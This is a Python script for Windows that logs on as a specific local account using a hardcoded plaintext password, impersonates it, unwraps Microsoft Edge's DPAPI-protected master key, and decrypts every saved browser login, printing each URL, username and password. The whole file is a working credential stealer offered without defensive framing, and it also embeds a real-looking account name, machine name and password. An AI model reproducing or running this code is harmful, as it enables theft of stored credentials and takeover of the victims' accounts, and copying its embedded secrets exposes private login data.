import ctypes, ctypes.wintypes, os, sys, json, base64, sqlite3, shutil

kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32
crypt32 = ctypes.windll.crypt32

LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]

def decrypt_dpapi(data):
    in_blob = DATA_BLOB(len(data), (ctypes.c_byte * len(data)).from_buffer_copy(data))
    out_blob = DATA_BLOB()
    result = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob), None, None, None, None, 1, ctypes.byref(out_blob)
    )
    if result:
        ptr = ctypes.cast(out_blob.pbData, ctypes.POINTER(ctypes.c_byte * out_blob.cbData))
        decrypted = bytes(ptr.contents)
        kernel32.LocalFree(out_blob.pbData)
        return decrypted
    return None

print("Logging on as osiris_admin...")
token = ctypes.wintypes.HANDLE()
result = advapi32.LogonUserW(
    "osiris_admin", "laptop-nstd8t96", "Pokemon55",
    LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
    ctypes.byref(token)
)

if not result:
    print("Logon failed: %d" % ctypes.GetLastError())
    sys.exit(1)

print("Logon succeeded!")

result2 = advapi32.ImpersonateLoggedOnUser(token)
if not result2:
    print("Impersonate failed: %d" % ctypes.GetLastError())
    kernel32.CloseHandle(token)
    sys.exit(1)

print("Impersonated!")

# Read Edge key
with open(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Local State", "r") as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
ciphertext = encrypted_key[5:]

print("Decrypting DPAPI key...")
result = decrypt_dpapi(ciphertext)
if result:
    print("DECRYPTED KEY: %s" % result.hex())
    decryption_key = result
else:
    error = ctypes.GetLastError()
    print("DPAPI failed: %d" % error)
    advapi32.RevertToSelf()
    kernel32.CloseHandle(token)
    sys.exit(1)

# Copy login DB to temp
tmp_db = os.environ['TEMP'] + "\\edge_pw_scan.db"
shutil.copy2(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Default\Login Data", tmp_db)

# Decrypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

conn = sqlite3.connect(tmp_db)
cursor = conn.cursor()
cursor.execute("SELECT id, origin_url, username_value, password_value FROM logins")
rows = cursor.fetchall()

print("\n=== EDGE PASSWORDS ===")
if not rows:
    print("  No saved passwords.")
    
for row in rows:
    print("\n[%d]" % row[0])
    print("  URL: %s" % row[1])
    print("  User: %s" % row[2])
    pw = row[3]
    if pw and len(pw) > 3 and pw[0] == 1:
        nonce = pw[3:15]
        ct = pw[15:-16]
        tag = pw[-16:]
        try:
            aesgcm = AESGCM(decryption_key)
            plain = aesgcm.decrypt(nonce, ct + tag, None)
            print("  PASS: %s" % plain.decode('utf-8', errors='replace'))
        except Exception as e:
            print("  [encrypted - %s]" % e)
    else:
        print("  [no password data]")

conn.close()
try: os.remove(tmp_db)
except: pass

advapi32.RevertToSelf()
kernel32.CloseHandle(token)
print("\nComplete.")
